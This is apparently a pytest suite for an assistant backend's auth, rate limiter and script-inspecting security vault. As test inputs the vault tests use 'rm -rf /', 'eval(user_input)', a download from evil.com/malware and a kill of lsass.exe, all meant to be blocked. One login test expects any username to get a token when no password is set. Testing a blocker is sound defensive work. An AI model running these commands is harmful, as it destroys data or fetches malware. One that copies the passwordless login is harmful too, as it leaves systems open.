"""
JARVIS Test Suite
=================
Tests for core modules: auth, rate limiter, security vault.
Run with: pytest backend/tests/ -v
"""

import os
import sys
import time
import secrets

# Add backend to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ═══════════════════════════════════════════════════════════════════
# Auth Tests
# ═══════════════════════════════════════════════════════════════════

class TestAuth:
    """Tests for the authentication module."""

    def test_jwt_create_and_decode(self):
        """Test JWT token creation and decoding."""
        from auth import create_jwt_token, decode_jwt_token

        token = create_jwt_token(
            user_id="test_user",
            scopes=["read", "write"],
            tenant_id="test_tenant",
        )

        assert isinstance(token, str)
        assert len(token) > 50

        payload = decode_jwt_token(token)
        assert payload["sub"] == "test_user"
        assert "read" in payload["scopes"]
        assert "write" in payload["scopes"]
        assert payload["tenant_id"] == "test_tenant"
        assert "exp" in payload
        assert "iat" in payload
        assert "jti" in payload

    def test_jwt_expiry(self):
        """Test that tokens have proper expiry."""
        from auth import decode_jwt_token
        from datetime import datetime, timedelta
        import jwt as pyjwt

        # Create a token that's already expired
        payload = {
            "sub": "test",
            "scopes": ["read"],
            "tenant_id": "default",
            "iat": datetime.utcnow() - timedelta(hours=100),
            "exp": datetime.utcnow() - timedelta(hours=1),
            "jti": "test123",
        }
        from auth import JWT_SECRET, JWT_ALGORITHM
        token = pyjwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

        try:
            decode_jwt_token(token)
            assert False, "Should have raised exception"
        except Exception:
            pass  # Expected

    def test_auth_context_scopes(self):
        """Test AuthContext scope checking."""
        from auth import AuthContext

        admin = AuthContext("admin", "jwt", scopes=["read", "write", "admin"])
        assert admin.has_scope("admin")
        assert admin.has_scope("read")
        assert admin.has_scope("write")

        reader = AuthContext("user", "jwt", scopes=["read"])
        assert reader.has_scope("read")
        assert not reader.has_scope("write")
        assert not reader.has_scope("admin")

    def test_auth_context_resource_access(self):
        """Test AuthContext resource access control."""
        from auth import AuthContext

        user = AuthContext("alice", "jwt", scopes=["read"])
        assert user.can_access("alice")  # Own resource
        assert not user.can_access("bob")  # Other's resource

        admin = AuthContext("admin", "jwt", scopes=["admin"])
        assert admin.can_access("alice")  # Admin can access anything
        assert admin.can_access("bob")


# ═══════════════════════════════════════════════════════════════════
# Rate Limiter Tests
# ═══════════════════════════════════════════════════════════════════

class TestRateLimiter:
    """Tests for the rate limiter."""

    def test_token_bucket_basic(self):
        """Test basic token bucket functionality."""
        from rate_limiter import TokenBucket

        bucket = TokenBucket(capacity=5, refill_rate=10.0)
        assert bucket.tokens == 5.0

        # Consume all tokens
        for _ in range(5):
            assert bucket.consume() is True
        assert bucket.consume() is False

    def test_token_bucket_refill(self):
        """Test token bucket refill over time."""
        from rate_limiter import TokenBucket

        bucket = TokenBucket(capacity=2, refill_rate=100.0)  # Fast refill
        bucket.consume()
        bucket.consume()
        assert bucket.consume() is False

        # Wait for refill
        time.sleep(0.05)
        assert bucket.consume() is True

    def test_rate_limiter_check(self):
        """Test the rate limiter check method."""
        from rate_limiter import RateLimiter

        limiter = RateLimiter()
        limiter._default_rate = 100.0  # High rate for testing
        limiter._default_capacity = 3

        # First few should be allowed
        for _ in range(3):
            allowed, retry = limiter.check("test_user", "/api/test")
            assert allowed is True

        # Next should be rate limited
        allowed, retry = limiter.check("test_user", "/api/test")
        assert allowed is False
        assert retry > 0

    def test_rate_limiter_strict_paths(self):
        """Test stricter rate limits for expensive endpoints."""
        from rate_limiter import RateLimiter

        limiter = RateLimiter()
        limiter._strict_rate = 1.0
        limiter._strict_capacity = 1

        # Strict endpoint should have lower limits
        allowed, _ = limiter.check("user1", "/api/router/dispatch")
        assert allowed is True
        allowed, _ = limiter.check("user1", "/api/router/dispatch")
        assert allowed is False

    def test_rate_limiter_stats(self):
        """Test rate limiter statistics."""
        from rate_limiter import RateLimiter

        limiter = RateLimiter()
        stats = limiter.get_stats()
        assert "active_buckets" in stats
        assert "default_rps" in stats
        assert "strict_rps" in stats


# ═══════════════════════════════════════════════════════════════════
# Security Vault Tests
# ═══════════════════════════════════════════════════════════════════

class TestSecurityVault:
    """Tests for the security vault."""

    def test_safe_script(self):
        """Test that safe scripts pass inspection."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script("print('hello world')", "python")
        assert result["safe"] is True

    def test_blocked_destructive_command(self):
        """Test that destructive commands are blocked."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script("rm -rf /", "bash")
        assert result["safe"] is False
        assert result["risk_level"] == "high"

    def test_blocked_eval(self):
        """Test that eval() is detected."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script('eval(user_input)', "python")
        assert result["safe"] is False
        assert len(result["violations"]) > 0

    def test_unblocked_domain(self):
        """Test that non-whitelisted domains are blocked."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script(
            'import urllib.request; urllib.request.urlopen("https://evil.com/malware")',
            "python",
        )
        assert result["safe"] is False

    def test_allowed_domain(self):
        """Test that whitelisted domains are allowed."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script(
            'import urllib.request; urllib.request.urlopen("https://github.com/repo")',
            "python",
        )
        # May have other violations (import os) but domain should be fine
        domain_violations = [v for v in result.get("violations", [])
                           if v.get("category") == "unauthorized_domain"]
        assert len(domain_violations) == 0

    def test_critical_process_kill(self):
        """Test that killing critical processes is blocked."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        payload = {
            "os_action_payload": {
                "action_type": "PROCESS_KILL",
                "target_identifier": "lsass.exe",
            }
        }
        result = vault.inspect_payload(payload)
        assert result["safe"] is False
        assert result["risk_level"] == "critical"

    def test_empty_script(self):
        """Test that empty scripts are safe."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        result = vault.inspect_script("", "python")
        assert result["safe"] is True

    def test_vault_stats(self):
        """Test vault statistics."""
        from security_vault import SecurityVault

        vault = SecurityVault()
        stats = vault.get_stats()
        assert stats["whitelisted_domains"] > 0
        assert stats["blocked_patterns"] > 0


# ═══════════════════════════════════════════════════════════════════
# API Integration Tests
# ═══════════════════════════════════════════════════════════════════

class TestAPI:
    """Integration tests for the FastAPI app."""

    def _get_client(self):
        """Create a test client."""
        try:
            from fastapi.testclient import TestClient
            # Need to import main without actually running startup events
            import importlib
            main_module = importlib.import_module("main")
            client = TestClient(main_module.app, raise_server_exceptions=False)
            return client
        except Exception:
            return None

    def test_health_endpoint(self):
        """Test the health check endpoint."""
        client = self._get_client()
        if not client:
            return  # Skip if dependencies not available
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "ok"
        assert data["assistant"] == "jarvis"

    def test_auth_status(self):
        """Test the auth status endpoint."""
        client = self._get_client()
        if not client:
            return
        response = client.get("/api/auth/status")
        assert response.status_code == 200
        data = response.json()
        assert "authenticated" in data
        assert "user_id" in data

    def test_auth_login(self):
        """Test the login endpoint."""
        client = self._get_client()
        if not client:
            return
        # Without password set, any username should work
        response = client.post("/api/auth/login", json={
            "username": "test_user",
        })
        assert response.status_code == 200
        data = response.json()
        assert "token" in data
        assert data["user_id"] == "test_user"

    def test_rate_limit_stats(self):
        """Test the rate limit stats endpoint."""
        client = self._get_client()
        if not client:
            return
        response = client.get("/api/rate-limit/stats")
        assert response.status_code == 200
        data = response.json()
        assert "active_buckets" in data


if __name__ == "__main__":
    # Run tests manually
    import pytest
    sys.exit(pytest.main([__file__, "-v"]))
